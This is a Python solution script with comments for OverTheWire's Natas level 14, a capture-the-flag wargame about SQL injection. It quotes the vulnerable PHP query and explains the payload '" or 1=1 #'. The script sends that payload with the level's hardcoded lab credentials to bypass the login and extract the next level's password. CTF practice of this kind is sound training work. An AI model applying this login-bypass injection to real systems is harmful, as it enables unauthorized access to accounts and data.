#!/usr/bin/env python3
'''
Level 14 → Level 15
SQL Injection
https://github.com/JohnHammond/overthewire_natas_solutions/blob/master/natas14.py
https://www.youtube.com/watch?v=krp0qCOAnFE&list=PL1H1sBF1VAKWM3wMCn6H5Ql6OrgIivt2V&index=12
Username: natas14
URL:      http://natas14.natas.labs.overthewire.org
password:   Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
problem:

write up:
    The importend source code lines are:

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if we'll chane the sql query to
        SELECT * from users where username = "please" or 1 = 1
    First use this url: http://natas14.natas.labs.overthewire.org?debug=true
    so our query will always  be output  Executing query:.......


Manual Mode
https://www.jonyschats.nl/writeups/overthewire/natas/natas14/
in user name put :  " or 1=1 #"
the Resulting SQL query will be:
    SELECT * from users where username="" or 1 = 1
'''


import requests



username = 'natas14'
password = 'Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1'

#url = 'http://%s.natas.labs.overthewire.org/' % username
url = 'http://%s.natas.labs.overthewire.org/?debug=true' % username

session = requests.Session()

response = session.post(url,
                        files = {   },
                        data = { "username" : 'please" OR 1 = 1#', "password" : "1000" },
                        auth = (username, password) )

content = response.text
print (content)# The source code without loading a file
import re
print (re.findall('natas15 is (.*)<br>', content)[0])

